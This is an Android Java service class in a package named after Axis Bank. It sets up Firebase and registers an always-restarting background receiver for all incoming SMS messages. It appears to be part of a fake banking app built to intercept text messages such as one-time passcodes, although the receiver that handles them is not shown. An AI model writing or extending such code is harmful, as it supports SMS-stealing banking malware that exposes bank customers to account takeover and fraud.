package com.bank.axisbank.HELPER;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;

import com.google.firebase.FirebaseApp;
import com.google.firebase.database.annotations.Nullable;

public class MyService extends Service {
    private BroadcastReceiver smsReceiver;

    @Override
    public void onCreate() {
        super.onCreate();
        // Initialize Firebase
        FirebaseApp firebaseApp = FirebaseApp.initializeApp(this);

        // Register the BroadcastReceiver
        smsReceiver =new SmsReceiver();
        IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(smsReceiver,intentFilter);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Perform any initialization or setup here
        return START_STICKY; // Service will be restarted if killed by the system
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        // Unregister the BroadcastReceiver
        unregisterReceiver(smsReceiver);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null; // No binding required for this example
    }

}

